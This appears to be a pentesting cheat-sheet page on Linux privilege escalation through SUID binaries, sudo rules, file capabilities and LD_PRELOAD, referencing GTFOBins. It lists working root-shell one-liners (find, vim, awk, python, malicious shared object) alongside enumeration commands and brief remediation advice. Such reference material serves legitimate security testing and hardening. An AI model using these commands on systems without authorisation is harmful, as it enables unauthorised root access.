---
tags:
  - Privesc
  - Linux
---

# :material-console-line: GTFOBins & SUID Abuse

<span class="pill pill-medium">quick wins</span> <span class="pill pill-info">privesc</span>

Ordinary binaries become privilege-escalation tools when they run as root — via SUID, a sudo rule, or capabilities. GTFOBins catalogs exactly which ones and how.

!!! abstract "TL;DR"
    Enumerate SUID binaries, sudo rules, and file capabilities, then look each up on GTFOBins for the one-liner that spawns a root shell.

## :material-magnify: Enumerate escalation primitives

```bash
sudo -l                                  # what can I run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
getcap -r / 2>/dev/null                  # file capabilities
```

## :material-flash: Classic abuses

=== "SUID"

    ```bash
    ./find . -exec /bin/sh -p \; -quit    # SUID find → root shell
    ```

=== "sudo (NOPASSWD)"

    ```bash
    sudo vim -c ':!/bin/sh'               # sudo vim → root
    sudo awk 'BEGIN{system("/bin/sh")}'
    ```

=== "capabilities"

    ```bash
    ./python -c 'import os;os.setuid(0);os.system("/bin/sh")'  # cap_setuid+ep
    ```

## :material-numeric: LD_PRELOAD / env preservation

If `sudo -l` shows `env_keep+=LD_PRELOAD`, load a malicious shared object as root:

```bash
sudo LD_PRELOAD=/tmp/x.so someprog       # x.so runs setuid(0);system("sh")
```

!!! opsec "Leaves a shell trail"
    Root shells from odd parents (vim→sh) are easy to spot in process auditing.

## :material-shield-check: Remediation

- Strip unnecessary SUID bits and capabilities; scope sudo rules tightly (no shells/editors).
- Avoid `env_keep` for `LD_*`.

## :material-link-variant: Related

- The bread-and-butter of [Linux Privesc](linux.md); pairs with [Credential Hunting](credential-hunting.md).
- Reference: [GTFOBins](https://gtfobins.github.io/).
